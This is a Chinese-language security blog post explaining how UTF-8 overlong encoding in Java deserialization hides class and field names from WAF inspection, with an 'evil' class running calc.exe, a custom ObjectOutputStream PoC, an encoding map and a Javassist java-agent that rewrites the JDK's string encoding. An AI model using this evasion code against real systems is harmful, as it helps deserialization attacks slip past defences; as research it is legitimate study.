<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>UTF-8 Overlong Encoding-Java反序列化 | Jiecub3</title>
<meta name="keywords" content="word 1, word 2">
<meta name="description" content="0x01 前言 Java反序列化中应用 @1ue UTF-8 Overlong Encoding原理 @p牛 拜读上面两篇文章后，感觉挺有意思的，跟着1ue师傅的文章再分析了下，这里UTF-">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="UTF-8 Overlong Encoding-Java反序列化" />
<meta property="og:description" content="0x01 前言 Java反序列化中应用 @1ue UTF-8 Overlong Encoding原理 @p牛 拜读上面两篇文章后，感觉挺有意思的，跟着1ue师傅的文章再分析了下，这里UTF-" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-12-12T20:01:23+08:00" />
<meta property="article:modified_time" content="2024-12-12T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="UTF-8 Overlong Encoding-Java反序列化"/>
<meta name="twitter:description" content="0x01 前言 Java反序列化中应用 @1ue UTF-8 Overlong Encoding原理 @p牛 拜读上面两篇文章后，感觉挺有意思的，跟着1ue师傅的文章再分析了下，这里UTF-"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "UTF-8 Overlong Encoding-Java反序列化",
      "item": "https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "UTF-8 Overlong Encoding-Java反序列化",
  "name": "UTF-8 Overlong Encoding-Java反序列化",
  "description": "0x01 前言 Java反序列化中应用 @1ue UTF-8 Overlong Encoding原理 @p牛 拜读上面两篇文章后，感觉挺有意思的，跟着1ue师傅的文章再分析了下，这里UTF-",
  "keywords": [
    "word 1", "word 2"
  ],
  "articleBody": "0x01 前言 Java反序列化中应用 @1ue\nUTF-8 Overlong Encoding原理 @p牛\n拜读上面两篇文章后，感觉挺有意思的，跟着1ue师傅的文章再分析了下，这里UTF-8 Overlong Encoding在java中解决了流量的监测的绕过，让明文类名在流量上不再是ascii中的字符，但是反序列化又能解析成正常数据，绕过waf拦截，但是分析完发现加密对应的值是固定的，不过可以2，3byte交叉混洗。\n下文对utf-8在反序列化中的原理进行了解析，然后构造poc并改进poc，实现全字段加密\n0x02 UTF-8 Overlong Encoding原理 这里大概解释下原理，具体也可以看p牛文章\nutf-8编码 参考这个表格，用于将unicode码转换成UTF-8编码：\nFirst code point Last code point Byte 1 Byte 2 Byte 3 Byte 4 U+0000 U+007F 0xxxxxxx U+0080 U+07FF 110xxxxx 10xxxxxx U+0800 U+FFFF 1110xxxx 10xxxxxx 10xxxxxx U+10000 U+10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 及当字符uincode编码超过U+007F时，UTF-8会用多个Byte来代表这个字符(U+0080-U+07FF这个范围就2个Byte，其他范围见上表)\n这种方式看似也没毛病，但是当我们把本身是1Byte字符，按照2Byte的格式（上图）构造会发生什么呢\nP牛用点号.举了个例子，其unicode编码和ascii编码一致，均为0x2E。按照上表，它只能被编码成单字节的UTF-8字符，但我按照下面的方法进行转换：\n0x2E的二进制是10 1110，我给其前面补5个0，变成00000101110 将其分成5位、6位两组：00000，101110 分别给这两组增加前缀110，10，结果是11000000，10101110，对应的是\\xC0\\xAE 0xC0AE并不是一个合法的UTF-8字符，但我们确实是按照UTF-8编码方式将其转换出来的，这就是UTF-8设计中的一个缺陷。\n这个问题在python中已经修复过了，但是java任然存在（我觉得java可以utf-8转化后再进行一次范围判断，1byte是小于127的）\n那我们进入正题，看看UTF-8 Overlong Encoding在java反序列化中的应用，反序列化存在这个问题是因为反序列化和反序列化将字符转换的方式正是上面utf-8到uincode这种模式进行转换的。\n0x03 readObject UTF-8 这里可以跟着1ue师傅文章看\ndemo方便调试\npackage UTF8; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class evil implements Serializable { private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); try { Runtime.getRuntime().exec(\"calc.exe\"); } catch (IOException e) { e.printStackTrace(); } } } 开始debug，观测readObject是何时拿取className的\n这里1ue师傅给出了调用链\nObjectStreamClass#readNonProxy(ObjectInputStream in) ObjectInputStream#readUTF() BlockDataInputStream#readUTF() ObjectInputStream#readUTFBody(long utflen) ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen) 关键点就在readUTFSpan()，反序列化evil类，打个断点，我们直接看这个函数干了啥\nutflen是获取的类名的长度，然后while执行stop-pos(一般就是utflen)次，来解析类名的每个字符存储到cbuf，最后再添加到sbuf，问题就在解析每个字节的时候\n从注释能一眼发现，是存在UTF-8编码规则的问题，下文结合图片分析问题\nprivate long readUTFSpan(StringBuilder sbuf, long utflen) throws IOException { int cpos = 0; int start = pos; int avail = Math.min(end - pos, CHAR_BUF_SIZE); // stop short of last char unless all of utf bytes in buffer int stop = pos + ((utflen \u003e avail) ? avail - 2 : (int) utflen); boolean outOfBounds = false; try { while (pos \u003c stop) { int b1, b2, b3; b1 = buf[pos++] \u0026 0xFF; switch (b1 \u003e\u003e 4) { case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7: // 1 byte format: 0xxxxxxx cbuf[cpos++] = (char) b1; break; case 12: case 13: // 2 byte format: 110xxxxx 10xxxxxx b2 = buf[pos++]; if ((b2 \u0026 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 \u0026 0x1F) \u003c\u003c 6) | ((b2 \u0026 0x3F) \u003c\u003c 0)); break; case 14: // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx b3 = buf[pos + 1]; b2 = buf[pos + 0]; pos += 2; if ((b2 \u0026 0xC0) != 0x80 || (b3 \u0026 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 \u0026 0x0F) \u003c\u003c 12) | ((b2 \u0026 0x3F) \u003c\u003c 6) | ((b3 \u0026 0x3F) \u003c\u003c 0)); break; default: // 10xx xxxx, 1111 xxxx throw new UTFDataFormatException(); } } } catch (ArrayIndexOutOfBoundsException ex) { outOfBounds = true; } finally { if (outOfBounds || (pos - start) \u003e utflen) { /* * Fix for 4450867: if a malformed utf char causes the * conversion loop to scan past the expected end of the utf * string, only consume the expected number of utf bytes. */ pos = start + (int) utflen; throw new UTFDataFormatException(); } } sbuf.append(cbuf, 0, cpos); return pos - start; } 这里看到下图，每次while会从buf数据流里取一个字符和0xFF做\u0026运算，然后b1右移动4位，就是b1去掉右边后4位剩下的二进制的10进制在0-7的范围就是属于1byte的，为什么是这个范围呢10000000是128，0xxxxxxx刚好就是(0-127),熟悉ascii就知道这个范围包含正常可打印字符范围(32-126)\n这里还是举个例子吧 eg:\n'a'的二进制是01100001，经过\u003e\u003e4运算后为0110，10进制是6会进入case 6:也就是1byte\n这里很容易发现2byte可能存在问题，我先不讲这个，这里我先想到的是没有case8:啊！！！那ascii 128怎么办\n128 欧元符号 128正式我们的欧元符号€，这里方便分析我直接改了evil类名，发现是可以用的\n生成的文件，我们发现€在java中其实对应3byte，因为他的uincode编码是U+20AC，这里按照上面转换表，这里突然加深了对表中xxx的理解\n这里xxx一共16位，20AC的二进制也是16位，然后填入后生成的3byte就是他的utf-8，（hhh之前没注意这个，刚刚想16位怎么24位的时候看到这个恍然大悟hhh\nU+0800 U+FFFF 1110xxxx 10xxxxxx 10xxxxxx\n20AC的二进制0010000010101100 –\u003e utf-8: 11100010 10000010 10101100\n及E282AC对应着序列化生成的内容，说明没错，所以不能按照ascii码的思维去想utf-8编码，反序列化中是按照uincode转化为utf-8\n既然都到这了，就简单分析下，3byte他是怎么转化的吧\n3byte 这里对应的是-30，-126，-84这里存储都是补码，及最高位位1时，补码和原码不同，这里这三最高位都是1，所以这里补码显示出来都是负数和原码不同\n这里就是简单分析下代码逻辑，这里识别到第一个字符是1110开头后=case14:,然后这里b3和b2会获取后两位byte，这里pos+0是因为前面获取b1时b1 = buf[pos++] \u0026 0xFF;，pos用的后++所以pos定位符已经向后了一位\nif ((b2 \u0026 0xC0) != 0x80 || (b3 \u0026 0xC0) != 0x80) { 这个是检测 b2 b3是不是以10xx xxxx的格式，C0是1100 0000，跟他做\u0026只有10xx xxxx的格式才会==0x80\n(char) (((b1 \u0026 0x0F) \u003c\u003c 12) |((b2 \u0026 0x3F) \u003c\u003c 6) |((b3 \u0026 0x3F) \u003c\u003c 0)) 然后看到这一段，其实就是恢复€的uincode编码的二进制，这里想成二进制就很好理解了\n这里b1 \u0026 0000 1111 得到就是0000 0010然后向左移动12位 0010 0000 0000 0000 这不是就uincode编码二进制前4位么，然后最后进行or运算，不就是得到完整的uincode编码的二进制么，然后10进制是8364再char转换成字符\nreal 128 但是我们意识到€只是ascii中的128，并不是uincode中的128，及u+0080，跟我们想要分析的东西貌似有点不一样，所以我们直接看看如果是128，java是怎么生成的\n根据getUTFLength()代码我们可以知道128是会走到2byte的\n这里发现会生成两个byte 194 和 130 11000010 10000010都是符合转码规则的，并不会出现我们想象中utf-8 128去转uincode没对应case8：的情况，因为存储为utf-8编码的时候根本不是128，想多了hhh（128utf-8本身就不合法）\n0x04 开始构造 2byte代码逻辑其实都不用看了，跟3byte差不了多少，就是让xxx里面的东西和我们要构造的二进制一样就行了，但是我们一般构造的都是可打印字符，一般只有8位2进制，这里xxx有11位，简单前面填0就好\n这个拿U实验，二进制是0101 0101 填3个0 000 0101 0101，然后按照2byte格式得到 11000001 10010101 及、0xC195\n我们将U替换成2byte，看到下图成功实现\n但是l没加载出来因为2byte要占用两个长度，而utflen还是原来的长度，所以让其+1就好\n其实不难想到既然反序列化是将utf-8转化成uincode，那序列化其实就是将uincode转化成utf-8编码存储的\nwriteUTF 我们简单调试下就能发现writeUTF这个方法是用来转化编码存储的\npublic void writeUTF(String s) throws IOException { writeUTF(s, getUTFLength(s)); } void writeUTF(String s, long utflen) throws IOException { if (utflen \u003e 0xFFFFL) { throw new UTFDataFormatException(); } writeShort((int) utflen); if (utflen == (long) s.length()) { writeBytes(s); } else { writeUTFBody(s); } } 这里我想构造的是2byte的数据，所以这里if (utflen == (long) s.length()) {肯定是false，进入writeUTFBody\nprivate void writeUTFBody(String s) throws IOException { int limit = MAX_BLOCK_SIZE - 3; int len = s.length(); for (int off = 0; off \u003c len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u003c csize; cpos++) { char c = cbuf[cpos]; if (pos \u003c= limit) { if (c \u003c= 0x007F \u0026\u0026 c != 0) { buf[pos++] = (byte) c; } else if (c \u003e 0x07FF) { buf[pos + 2] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); buf[pos + 0] = (byte) (0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); pos += 3; } else { buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); buf[pos + 0] = (byte) (0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); pos += 2; } } else { // write one byte at a time to normalize block if (c \u003c= 0x007F \u0026\u0026 c != 0) { write(c); } else if (c \u003e 0x07FF) { write(0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); write(0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } else { write(0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } } } off += csize; } } 在这里代码我们很容易就发现是将uincode编码转化成utf-8编码的格式，只是有范围判定，我当时第一反应就是重写这个方法，把这个范围改了，不就能让java帮我们2byte编码了么hh\n还有个点就是长度 通过getUTFLength()返回，也跟范围有关，那把这个也重写不就行啦hh\nlong getUTFLength(String s) { int len = s.length(); long utflen = 0; for (int off = 0; off \u003c len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u003c csize; cpos++) { char c = cbuf[cpos]; if (c \u003e= 0x0001 \u0026\u0026 c \u003c= 0x007F) { utflen++; } else if (c \u003e 0x07FF) { utflen += 3; } else { utflen += 2; } } off += csize; } return utflen; } poc构造 其实我们最大的问题就是不能直接重写writeUTFBody方法（这里的时候还不会agent！_!），因为他是private且是ObjectOutputStream的子类\n我们看到writeUTFBody if会判断范围然后进行对应byte的编码，然后注意下这里数据少（\u003c1024）的时候不会执行下方else中write()方法，哪里会进行写入呢，我们根据调用栈往上查找\n见下图，writeClassDescriptor(desc);就是上面执行写入buf的操作。而bout.setBlockDataMode(true);里的drain()函数才是真正写入数据的时候\ndrain() void drain() throws IOException { if (pos == 0) { return; } if (blkmode) { writeBlockHeader(pos); } out.write(buf, 0, pos); pos = 0; } 这里out.write才是真正进行写入操作的地方。\nbuf 还记得我们的问题么，不能直接重写writeUTFBody方法，那能不能设置这个buf值呢？\n反射？其实不行，因为我们要在执行drain()前一刻覆盖这个值，过早会被writeUTFBody会被覆盖，过晚也不行。\n但是天无绝人之路！！我们回想到writeUTFBody中下面一个else里不是有write操作么？这个是什么逻辑呢\nif (pos \u003c= limit) { if (c \u003c= 0x007F \u0026\u0026 c != 0) { buf[pos++] = (byte) c; } else if (c \u003e 0x07FF) { buf[pos + 2] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); buf[pos + 0] = (byte) (0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); pos += 3; } else { buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); buf[pos + 0] = (byte) (0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); pos += 2; } } else { // write one byte at a time to normalize block if (c \u003c= 0x007F \u0026\u0026 c != 0) { write(c); } else if (c \u003e 0x07FF) { write(0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); write(0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } else { write(0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } } 我们可以看到超过limit会进入到这个else，limit是1204-3，我们看看write干了啥\n可以看到当pos超过MAX_BLOCK_SIZE执行了drain(),就是进行写入，然后pos归0，然后会把(byte) b记录到BlockDataOutputStream.buf中这里不就可以设置buf变量的值了么，但是这个是BlockDataOutputStream类的方法，我们也调不了呀\n但是ObjectOutputStream也有个write可以帮我们调用BlockDataOutputStream的write了hhh\npublic void write(int val) throws IOException { bout.write(val); } 那我们可以直接通过ObjectOutputStream.write来将我们要写入的值记录到BlockDataOutputStream.buf中，然后drain()的时候进行写入。\n心理路程，挺乱的可以不看\n不能直接重写writeUTFBody，但是我们可以重写writeUTF他是ObjectOutputStream方法且是public，然后把writeUTF中需要吊用的方法都可以重新构造成我们的方法（getUTFLength，writeUTFBody）//最开始我以为是重写了后面发现其实不是，刚开始我以为就修改下范围就搞定了，发现其实不是这么事，最初的poc（就是下面poc1把注释取消的代码）并没有进行类名的写入，继续调试了下代码发现writeBytes和writeUTFBody中其实并不会执行真正的write操作，只是把值记录到BlockDataOutputStream.buf变量中，而我poc的类也只是记录到MyObjectOutputStream.buf,而不是BlockDataOutputStream中的buf这也是执行drain()的时候，其实buf里没有值hhh，所以没有写入\npoc1 这里我把2处小于7F的范围改成，c \u003c= 0x0020 \u0026\u0026 c != 0，20对应的是32，空白符就1byte的格式，大于32的就采用2byte，实现我们的加密。\npoc中只有writeUTF(String s)是重写，其他都是我们自己构建的这些方法，因为父类没有这些方法，而writeUTF(String s, long utflen)是因为包的原因其实也不是重写。\npackage UTF8; import java.io.IOException; import java.io.ObjectOutputStream; import java.io.OutputStream; import java.io.UTFDataFormatException; public class MyObjectOutputStream extends ObjectOutputStream { private static final int MAX_BLOCK_SIZE = 1024; /** maximum data block header length */ private final char[] cbuf = new char[CHAR_BUF_SIZE]; /** (tunable) length of char buffer (for writing strings) */ private static final int CHAR_BUF_SIZE = 256; private int pos = 0; private final byte[] buf = new byte[MAX_BLOCK_SIZE]; public MyObjectOutputStream(OutputStream out) throws IOException { super(out); } public void writeUTF(String s) throws IOException { writeUTF(s, getUTFLength(s)); } void writeUTF(String s, long utflen) throws IOException { if (utflen \u003e 0xFFFFL) { throw new UTFDataFormatException(); } writeShort((int) utflen); if (utflen == (long) s.length()) { writeBytes(s); } else { writeUTFBody(s); } } private void writeUTFBody(String s) throws IOException { int limit = MAX_BLOCK_SIZE - 3; int len = s.length(); for (int off = 0; off \u003c len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u003c csize; cpos++) { char c = cbuf[cpos]; // if (pos \u003c= limit) { // if (c \u003c= 0x0020 \u0026\u0026 c != 0) { // buf[pos++] = (byte) c; // } else if (c \u003e 0x07FF) { // buf[pos + 2] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); // buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); // buf[pos + 0] = (byte) (0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); // pos += 3; // } else { // buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); // buf[pos + 0] = (byte) (0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); // pos += 2; // } // } else { // write one byte at a time to normalize block if (c \u003c= 0x0020 \u0026\u0026 c != 0) { write(c); } else if (c \u003e 0x07FF) { write(0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); write(0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } else { write(0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } // } } off += csize; } } long getUTFLength(String s) { int len = s.length(); long utflen = 0; for (int off = 0; off \u003c len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u003c csize; cpos++) { char c = cbuf[cpos]; if (c \u003e= 0x0001 \u0026\u0026 c \u003c= 0x0020) { utflen++; } else if (c \u003e 0x07FF) { utflen += 3; } else { utflen += 2; } } off += csize; } return utflen; } } package UTF8; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class test { public static void main(String[] args) throws Exception { evil evil = new evil(); FileOutputStream fileOut = new FileOutputStream(\"1obj.bin\"); MyObjectOutputStream out = new MyObjectOutputStream(fileOut); out.writeObject(evil); out.close(); FileInputStream fileIn = new FileInputStream(\"1obj.bin\"); ObjectInputStream in = new ObjectInputStream(fileIn); in.readObject(); in.close(); } } 我们可以看到生成数据流已经没有可打印字符了\n�� \u0005sr UTF8.evil����4��\u000e\u0002 xp //这个是正常生成的可以看到明文类名 然后我看了下网上最开始的方案吧\n是设置了一个转换的map，然后将length*2or3，然后直接write的这种形式，现在看感觉可能感觉有点小笨拙hh，但我的poc和这种方式都有一个问题就是都只针对了classname还有属性名和属性值没操作呀！！！我的评价是imperfect\nmap = new HashMap\u003c\u003e(); map.put('.', new int[]{0xc0, 0xae}); map.put(';', new int[]{0xc0, 0xbb}); map.put('$', new int[]{0xc0, 0xa4}); map.put('[', new int[]{0xc1, 0x9b}); map.put(']', new int[]{0xc1, 0x9d}); map.put('a', new int[]{0xc1, 0xa1}); map.put('b', new int[]{0xc1, 0xa2}); map.put('c', new int[]{0xc1, 0xa3}); map.put('d', new int[]{0xc1, 0xa4}); map.put('e', new int[]{0xc1, 0xa5}); map.put('f', new int[]{0xc1, 0xa6}); 可以看到既然还有getRuntime这种字眼！！\n那么就开始我们的perfect之路吧\n调试发现在writeString会对属性进行操作\n但是writeString和writeTypeString都不是public呀，我们不能直接重写。\n要重写writeString的话要到在一个包里面呀，没错我还真这么干了。。。。但是没成功hh\n我们本地生成个package也是java.io，然后在另一个类调用一次我们的MyObjectOutputStream，目的是生成class文件，在target中找到class文件，关闭相关java应用然后找到这个rt.jar包插入我们class，我把java源码放到src.zip中了方便调试\n执行是成功了，生成的东西看着也没啥毛病，但是反序列化的时候出问题了，但是我不想分析这个了，跟我最初的思路背道而驰了\n估计是这个handles的问题，我把这个handles编码相关的都注释了，不然运行不了，因为他也是一个子类的值后面又很麻烦！——！\n看到writeString归根到底，还是调用的writeUTFBody方法，那我都到修改java.io下的包了，为什么不直接修改writeUTFBody里的代码不就行了么？？\n但是我又懒得再操作一篇了hh，因为我看到了这篇文章 用agent操作 ，思路是一样就是修改writeUTFBody的代码，文章中是注释了其他if范围限制，都用3byte的形式生成utf-8编码\n0x05 agent 当然啦对于不会agent的小伙伴来说，会有点困难，笔者这里也不会不然不至于绕那么多圈子，那就在这里突破极限！！\n推荐两篇文章，demo构建起来挺顺利的，也有个大概的理解，这里主要用来修改字节码\n通过 -javaagent 参数指定 agent, 从而在 JVM 启动之前修改 class 内容 (自 JDK 1.5) 通过 VirtualMachine.attach() 方法, 将 agent 附加在启动后的 JVM 进程中, 进而动态修改class内容，然后重新加载这个class (自 JDK 1.6) https://xz.aliyun.com/t/12626?time__1311=GqGxuD2DgAuDlrzY0%3DKqTa%3DeGQnox#toc-0\nhttps://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#ide-%E9%85%8D%E7%BD%AE //window跟这篇直接idea构造的demo\n这里就不再叙述了，记录下构建demo的一些细节的地方\n依赖可以直接 在库里面添加java来添加jar 或者pom.xml\ncom.sun tools 1.8.0 system C:/MyFiles/Tools/ENV/JAVA/jdk1.8.0_74/lib/tools.jar -javaagent 这里idea点击修改选项，然后添加虚拟机选项，这时会在test类上方多出一行，这个地方填入我们的javaagent\n其中带有 Instrumentation inst 参数的方法优先级更高, 会优先被调用\n这句话的理解，我实验的结果是，两个premain都存在的时候只执行了inst参数的，当只有args参数的premain的时候会输出 on inset\nagentmain 方式 Demo\npackage com.example; import java.lang.instrument.Instrumentation; public class Demo { public static void agentmain(String args, Instrumentation inst) throws Exception { System.out.println(\"agentmain\"); } } MANIFEST.MF\nManifest-Version: 1.0 Agent-Class: com.example.Demo 然后打包成agent.jar\n另一个idea项目下\ntest用于模拟一直运行的程序\npublic class test { public static void main(String[] args) throws InterruptedException { while (true) { System.out.println(\"Hello World\"); Thread.sleep(1000); } } } jps找到test对应id\nimport com.sun.tools.attach.*; import java.io.IOException; import java.util.List; public class agent_test { public static void main(String[] args) throws AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException { VirtualMachine attach = VirtualMachine.attach(\"21476\"); // 命令行找到这个jvm的进程号 attach.loadAgent(\"C:\\\\Users\\\\jie\\\\Desktop\\\\Java\\\\Learn\\\\out\\\\artifacts\\\\agent_jar\\\\agent.jar\"); attach.detach(); System.out.println(\"attach ok\"); // List list = VirtualMachine.list(); // 得到 JVM 进程列表 // for (VirtualMachineDescriptor desc : list){ // 遍历 // String name = desc.displayName(); // 进程名 // String pid = desc.id(); // PID // // if (name.contains(\"test\")){ // System.out.println(pid); // VirtualMachine vm = VirtualMachine.attach(pid); // vm.loadAgent(\"C:\\\\Users\\\\jie\\\\Desktop\\\\Java\\\\Learn\\\\out\\\\artifacts\\\\agent_jar\\\\agent.jar\"); // vm.detach(); // System.out.println(\"attach ok\"); // break; // } // } } } 然后运行agent_test进行attach，成功执行agentmain()中的代码\n实战 我们学完agent怎么修改class后解决这个问题轻而易举！\n我这里是用premain，然后通过javaagent来加载我们生成的jar包，这里直接上我最后的poc吧\nJieTransformer\npackage com.jie; import javassist.*; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; import java.io.IOException; public class JieTransformer implements ClassFileTransformer { @Override public byte[] transform(ClassLoader loader, String className, Class\u003c?\u003e classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { try { //拦截即将被加载或重加载的class if(className.equals(\"java/io/ObjectOutputStream$BlockDataOutputStream\")) { System.out.println(\"111111111111111\"); ClassPool cp = ClassPool.getDefault(); cp.importPackage(IOException.class.getName()); // if (classBeingRedefined != null) { // ClassClassPath ccp = new ClassClassPath(classBeingRedefined); // cp.insertClassPath(ccp); // } CtClass ctc = cp.get(\"java.io.ObjectOutputStream$BlockDataOutputStream\"); CtMethod method1 = ctc.getDeclaredMethod(\"getUTFLength\", new CtClass[]{cp.get(\"java.lang.String\")}); ctc.removeMethod(method1); CtMethod make1=CtNewMethod.make(\"long getUTFLength(String s) {\\n\" + \" int len = s.length();\\n\" + \" long utflen = 0;\\n\" + \" for (int off = 0; off \u003c len; ) {\\n\" + \" int csize = Math.min(len - off, CHAR_BUF_SIZE);\\n\" + \" s.getChars(off, off + csize, cbuf, 0);\\n\" + \" for (int cpos = 0; cpos \u003c csize; cpos++) {\\n\" + \" char c = cbuf[cpos];\\n\" + // \" if (c \u003e= 0x0001 \u0026\u0026 c \u003c= 0x0020) {\\n\" + // \" utflen++;\\n\" + // \" } else if (c \u003e 0x07FF) {\\n\" + // \" utflen += 3;\\n\" + // \" } else {\\n\" + \" utflen += 2;\\n\" + // \" }\\n\" + \" }\\n\" + \" off += csize;\\n\" + \" }\\n\" + \" return utflen;\\n\" + \" }\",ctc); CtMethod method2 = ctc.getDeclaredMethod(\"writeUTFBody\", new CtClass[]{cp.get(\"java.lang.String\")}); ctc.removeMethod(method2); CtMethod make2=CtMethod.make(\"private void writeUTFBody(String s) {\\n\" + \" int limit = MAX_BLOCK_SIZE - 3;\\n\" + \" int len = s.length();\\n\" + \" for (int off = 0; off \u003c len; ) {\\n\" + \" int csize = Math.min(len - off, CHAR_BUF_SIZE);\\n\" + \" s.getChars(off, off + csize, cbuf, 0);\\n\" + \" for (int cpos = 0; cpos \u003c csize; cpos++) {\\n\" + \" char c = cbuf[cpos];\\n\" + \" if (pos \u003c= limit) {\\n\" + // \" if (c \u003c= 0x0020 \u0026\u0026 c != 0) {\\n\" + // \" buf[pos++] = (byte) c;\\n\" + // \" } else if (c \u003e 0x07FF) {\\n\" + // \" buf[pos + 2] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F));\\n\" + // \" buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 6) \u0026 0x3F));\\n\" + // \" buf[pos + 0] = (byte) (0xE0 | ((c \u003e\u003e 12) \u0026 0x0F));\\n\" + // \" pos += 3;\\n\" + // \" } else {\\n\" + \" buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F));\\n\" + \" buf[pos + 0] = (byte) (0xC0 | ((c \u003e\u003e 6) \u0026 0x1F));\\n\" + \" pos += 2;\\n\" + // \" }\\n\" + \" } else { // write one byte at a time to normalize block\\n\" + // \" if (c \u003c= 0x0020 \u0026\u0026 c != 0) {\\n\" + // \" write(c);\\n\" + // \" } else if (c \u003e 0x07FF) {\\n\" + // \" write(0xE0 | ((c \u003e\u003e 12) \u0026 0x0F));\\n\" + // \" write(0x80 | ((c \u003e\u003e 6) \u0026 0x3F));\\n\" + // \" write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F));\\n\" + // \" } else {\\n\" + \" write(0xC0 | ((c \u003e\u003e 6) \u0026 0x1F));\\n\" + \" write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F));\\n\" + // \" }\\n\" + \" }\\n\" + \" }\\n\" + \" off += csize;\\n\" + \" }\\n\" + \" }\",ctc); ctc.addMethod(make1); ctc.addMethod(make2); byte[] bytes = ctc.toBytecode(); ctc.detach(); System.out.println(\"maked\"); return bytes; } } 